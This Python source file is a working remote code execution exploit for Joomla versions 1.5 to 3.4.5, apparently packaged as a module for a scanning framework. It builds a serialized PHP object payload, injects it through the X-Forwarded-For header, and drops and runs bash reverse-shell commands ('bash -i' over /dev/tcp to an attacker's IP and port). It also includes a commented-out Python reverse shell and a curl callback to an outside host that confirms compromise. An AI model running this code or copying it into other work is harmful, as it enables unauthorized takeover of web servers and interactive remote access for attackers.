import requests
import socket
import base64
import os
import sys
import uuid
from Framework.Valueconfig import FORMATTIME, ValueStatus
import json
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) "\
             "AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mob"\
             "ile/9A334 Safari/7534.48.3"

class JoomlaRCE():
    
    def banner():
        os.system('clear')
        print("\n")
        print("Joomla 1.5 - 3.4.5 RCE Exploit - Rev Shell - anarcoder at protonmail.com\n")

    def conversor(self, data):
        """Conversor method.

        Converts rce to use in payload injection by php object"""
        converted_cmd = ""
        for char in data:
            converted_cmd += "chr({0}).".format(ord(char))
        return converted_cmd[:-1]

    def build_payload(self, rce_payload):
        """Build the X-Forwarded-For header.

        Generates payload to inject on the header.
        """
        rce_payload = "eval({0})".format(self.conversor(rce_payload))
        end = '\xf0\xfd\xfd\xfd'
        payload = r'''}__test|O:21:"JDatabaseDriverMysqli":'''\
                  r'''3:{s:2:"fc";O:17:"JSimplepieFactory":'''\
                  r'''0:{}s:21:"\0\0\0disconnectHandlers";'''\
                  r'''a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{'''\
                  r'''s:8:"sanitize";O:20:"JDatabaseDriverMysql":'''\
                  r'''0:{}s:8:"feed_url";'''
        payload_field = "{0};JFactory::getConfig();exit".format(rce_payload)
        payload += r'''s:{0}:"{1}"'''.format(str(len(payload_field)),
                                             payload_field)
        payload += r''';s:19:"cache_name_function";s:6:"assert";'''\
                   r'''s:5:"cache";b:1;s:11:"cache_class";O:20:'''\
                   r'''"JDatabaseDriverMysql":0:{}}i:1;s:4:'''\
                   r'''"init";}}s:13:"\0\0\0connection";b:1;}''' + end
        return payload

    def build_reverse_shell(self, ip, port):
        """Build python reverse shell.

        Generates the python shell to send to target."""
        shell_name = "anarcoder.sh"
        # pentestmonkey's Bash reverse shell one-liner:
        str_shell = 'bash -i >& /dev/tcp/{}/{} 0>&1'.format(ip, port)
        payload = '''echo "'''+str_shell+'''" > /tmp/'''+shell_name+''''''
        # source = "'{0}', {1}".format(ip, port)
        # rev_shell = '''import socket,subprocess,os;s=socket.socket'''\
        #             '''(socket.AF_INET,socket.SOCK_STREAM);'''\
        #             '''s.connect((''' + source + '''));os.dup2'''\
        #             '''(s.fileno(),0); os.dup2(s.fileno(),1); '''\
        #             '''os.dup2(s.fileno(),2);p=subprocess.call'''\
        #             '''(["/bin/sh","-i"]);'''
        # b64shell = base64.b64encode(rev_shell.encode())
        # hell = "echo {0} | base64 -d > /tmp/anarcoder.py".format(
        #     b64shell.decode('utf-8'))
        return payload

    def build_exploit_shell_check(self, url_check): 
        rev_shell = '''import requests;s=requests.get(''' + url_check + ''', timeout=5)'''
        b64shell = base64.b64encode(rev_shell.encode())
        hell = "echo {0} | base64 -d > /tmp/anarcoder.py".format(
            b64shell.decode('utf-8'))
        return hell

    def exploit_target(self, url,url_check, src_ip, src_port, mode):
        """Exploit target method.

        Execute the exploit on target for reverse shell."""
        print('[+] Attacking: ' + url)

        headers = {'User-Agent': user_agent,
                   'x-forwarded-for': ''}

        req = requests.Session()
        if(mode == "exploit"): 
            payload = self.build_payload("system('curl " + url_check + "');")
        if mode == "shell": 
            pyshell = '''system(" /bin/bash -c 'bash -i > /dev/tcp/{}/{} 0>&1' ");'''.format(src_ip, src_port)
            print(pyshell)
            payload = self.build_payload(pyshell)

        print('[+] Attempting upload RCE...')
        headers['x-forwarded-for'] = payload
        self.send_exploit(req, url, headers)

        print('[+] Executing RCE...')
        payload = self.build_payload("system('./tmp/anarcoder.sh');")
        headers['x-forwarded-for'] = payload
        self.send_exploit(req, url, headers)

    def send_exploit(self, request, url, headers):
        """Send exploit to target."""
        for _ in range(2):
            try:
                request.get(url, headers=headers, timeout=20)
            except:
                pass


def exploit(url, url_host_check): 
    
    flag = uuid.uuid4().hex
    shell = url_host_check + "/requestbin?data="+flag
    joomla = JoomlaRCE()
    joomla.exploit_target(url, shell, 1,1, "exploit")
    Check_success = requests.get(url_host_check + "/logrequestbin?data="+flag)
    if Check_success.status_code == 200:
        data = json.loads(Check_success.text)
        if data['status'] == ValueStatus.Success:
            return shell
        else: 
            return False

def rce(url, lhost, lport): 
    joomla = JoomlaRCE()
    joomla.exploit_target(url,1, lhost, lport, "shell")
